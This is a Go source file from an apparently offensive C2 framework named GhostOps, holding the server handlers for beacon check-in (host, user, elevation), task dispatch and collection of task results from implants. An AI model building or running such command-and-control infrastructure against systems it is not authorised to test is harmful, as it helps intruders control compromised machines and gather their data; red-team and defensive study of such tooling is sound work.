package handlers

import (
	"encoding/json"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/4w4647/GhostOps/server/store"
)

type C2 struct {
	Store *store.Store
	Log   *log.Logger
}

func (h *C2) log() *log.Logger {
	if h.Log != nil {
		return h.Log
	}
	return log.Default()
}

func (h *C2) Checkin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var info store.BeaconInfo
	if err := json.NewDecoder(r.Body).Decode(&info); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	info.LastSeen = time.Now()
	h.Store.Upsert(&info)
	h.log().Printf("[C2] check-in  id=%-10d  host=%-20s  user=%s\\%s  elevated=%v",
		info.BeaconID, info.Hostname, info.Domain, info.Username, info.IsElevated)
	w.WriteHeader(http.StatusOK)
}

func (h *C2) Tasks(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
	if len(parts) < 2 || parts[1] == "" {
		http.Error(w, "missing beacon id", http.StatusBadRequest)
		return
	}
	id64, err := strconv.ParseUint(parts[1], 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	tasks := h.Store.PollTasks(uint32(id64))
	if len(tasks) > 0 {
		h.log().Printf("[C2] task-poll  id=%-10d  dispatching %d task(s)", id64, len(tasks))
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(tasks)
}

func (h *C2) Result(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var result store.TaskResult
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	h.Store.SubmitResult(&result)
	h.log().Printf("[C2] result     id=%-10d  task=%s  bytes=%d  err=%q",
		result.BeaconID, result.TaskID, len(result.Output), result.Error)
	w.WriteHeader(http.StatusOK)
}
